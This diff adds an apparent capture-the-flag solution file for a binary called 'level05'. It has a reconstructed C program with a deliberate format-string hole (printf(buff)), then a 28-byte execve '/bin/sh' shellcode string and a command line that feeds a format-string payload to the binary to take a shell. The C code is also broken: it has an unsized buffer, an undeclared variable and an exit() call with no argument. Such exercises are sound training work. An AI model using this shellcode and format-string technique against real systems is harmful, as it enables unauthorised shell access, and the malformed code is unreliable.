@@ -1,0 +1,28 @@
+#include <stdio.h>
+#include <stdlib.h>
+
+int     main(void)
+{
+    int something;
+    char buff[];
+
+    something = 0;
+    fgets(buff, 100, stdin); // char *fgets(char *s, int size, FILE *stream);
+    strlen(buff);
+    tmp = 0;
+    while (tmp < strlen(buff))
+    {
+        if ((buff[tmp] <= 0x40) || (buff[tmp] > 0x5a) ) // 0x40 = 64 @
+            tmp ++;
+        else
+            buff[tmp] = buff[tmp] ^ 32;
+    }
+    printf(buff);
+    exit();
+}
+
+
+
+char shellcode[] = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"; // size : 28 byte
+(python -c  'print "\x13\x55\xe4\xf7" +  "%10$42949p"'; cat) | ./level05
+
